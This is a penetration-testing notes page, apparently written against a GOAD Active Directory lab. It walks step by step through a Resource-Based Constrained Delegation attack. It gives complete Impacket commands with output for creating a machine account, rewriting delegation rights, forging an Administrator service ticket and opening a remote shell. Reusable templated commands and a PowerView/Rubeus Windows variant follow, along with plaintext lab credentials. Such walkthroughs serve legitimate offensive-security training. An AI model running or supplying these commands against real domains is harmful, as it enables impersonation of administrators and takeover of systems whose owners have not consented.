**Resource-Based Constrained Delegation (RBCD)** is a delegation method in Active Directory environments where control over delegation is assigned to the resource. It works by allowing a resource (like a server) to specify which accounts can impersonate users to access that resource using their Kerberos tickets (TGS—Ticket Granting Service).

If a user has GenericAll/GenericWrite over a host, RBCD is possible.

![[Pasted image 20241109135409.png]]

### User

- stannis.baratheon@sevenkingdoms.local:Drag0nst0ne

### The Attack

First, we need to add a computer account:

```bash
garffff@garffff:~/GOAD$ addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip 192.168.56.10 sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account rbcd$ with password rbcdpass.
```

Next, is to add the delegation access:

```bash
garffff@garffff:~/GOAD$ rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 192.168.56.10 -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] rbcd$ can now impersonate users on kingslanding$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     rbcd$        (S-1-5-21-2059722235-425686273-3516464344-1127)
```

We can now impersonate the target user by requesting a TGS:

```bash
garffff@garffff:~/GOAD/v1$ getST.py -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 192.168.56.10 'sevenkingdoms.local/rbcd$:rbcdpass'
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Load the ticket:

```bash
garffff@garffff:~/GOAD/v1$ export KRB5CCNAME=Administrator.ccache
```

Access the target host (DNS is required):

```bash
garffff@garffff:~/GOAD/v1$ wmiexec.py -k -no-pass kingslanding.sevenkingdoms.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
sevenkingdoms\administrator
```

### Summary

```bash
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-ip <dc_ip> '<domain>/<user>:<password>
rbcd.py -delegate-from 'rbcd$' -delegate-to '<target_computer>' -dc-ip <dc_ip> -action 'write' '<domain>/<user>:<password>
getST.py -spn 'cifs/<target_computer>.<domain>' -impersonate <target_user> -dc-ip <dc_ip> '<domain>/rbcd$:rbcdpass'
export KRB5CCNAME=<target_user>.ccache
wmiexec.py -k -no-pass <target_computer>.<domain>
```

### From Windows

```bash
Import-Module .\powermad.ps1
Import-Module .\powerview.ps1

$TargetComputer = "<target_computer>.<domain>"  
$AttackerSID = Get-DomainUser <user> -Properties objectsid | Select -Expand objectsid  
$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}  
ConvertFrom-SID $ACE.SecurityIdentifier  
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)  
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid  
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList  
"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"  
$SDBytes = New-Object byte[] ($SD.BinaryLength)  
$SD.GetBinaryForm($SDBytes, 0)  
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}  
$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-  
allowedtoactonbehalfofotheridentity  
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0

.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:<domain>

.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/<target_computer>.<domain> /ptt

#Clean up
Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
```